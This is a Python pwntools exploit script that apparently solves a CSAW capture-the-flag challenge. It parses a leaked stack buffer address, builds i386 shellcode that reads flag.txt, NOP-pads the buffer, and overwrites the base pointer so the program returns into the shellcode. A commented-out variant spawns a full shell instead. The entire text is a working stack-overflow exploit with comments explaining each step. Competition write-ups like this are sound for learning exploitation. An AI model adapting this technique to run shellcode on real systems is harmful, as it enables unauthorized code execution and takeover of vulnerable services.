#Some great tools for the hacks
from pwn import *

#Connect to the hacknight server and challenge
r = remote("misc.chal.csaw.io", 8001)
(r.recvuntil('x')) #Clear prompt text, get to buffer location

#Get buffer address
addr = r.recvline() #Grab the rest of the line
change = int(addr[6:8], 16) + 0x4 #Add four to the return address
#We're going to format our buffer to be:
# 0x00: bufferLocation
# 0x04: shellcode and nop filler
# 0x44: basePointer overwrite causes the stack to actually pop
#         off the first four bytes as the return address, which
#         is the next byte after those - our shellcode
addr = str(hex(change))[2:4] + addr[4:6] + addr[2:4] + addr[0:2] #Reformat
print("Buffer is at: 0x" + addr + " (" + addr.decode("hex") + ')')

#cat flag command generation
print("Generating shellcode: 'cat flag'")
xploit = (asm(shellcraft.i386.linux.cat("flag.txt")))
#Alternatively, take the system:
#print("Generating shellcode: Launch Shell")
#xploit = (asm(shellcraft.i386.linux.sh()))

#Create string to send
xploit = addr.decode("hex") + xploit # Return value at beginning of stack frame
bufferSize = 0x44

#NOP pad for overflowing the buffer until the return overwrite
asmNop = (asm(shellcraft.i386.nop()))
for i in range(bufferSize - len(xploit)): #NOP pad
    xploit += asmNop

#Append the BasePointer overwrite
xploit += addr.decode("hex")

#Why not print the thing? It's coolish
print("Compiled Exploit: '" + xploit + "'")

#Send xploit, get flags
r.sendline(xploit)
print(r.recvall())
